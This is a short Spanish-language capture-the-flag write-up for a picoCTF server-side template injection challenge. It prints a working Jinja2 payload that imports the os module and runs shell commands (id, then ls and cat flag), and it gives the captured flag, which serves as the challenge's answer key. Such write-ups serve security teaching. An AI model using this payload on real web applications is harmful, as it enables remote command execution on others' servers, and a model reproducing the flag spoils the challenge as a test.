Descripción
¡Hice un sitio web genial donde puedes anunciar lo que quieras! ¡Pruébalo!

Los detalles adicionales estarán disponibles después de lanzar su instancia de desafío.

Hints:
1.⁠ ⁠Inyección de plantilla del lado del servidor

Solución 1

Con RCE

INvestigando encontre este codigo que   ejecuta un **comando del sistema (`id`) desde una plantilla** (probablemente Jinja2) mediante **inyección de código en el servidor** (RCE).
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}

dando un ls cambiando por el id me muestra que hay una flag y con cat flag despliego la bandera


picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_3066c7bd}


Notas adicionales

--------------------


Referencias

https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/
http://rescued-float.picoctf.net:57338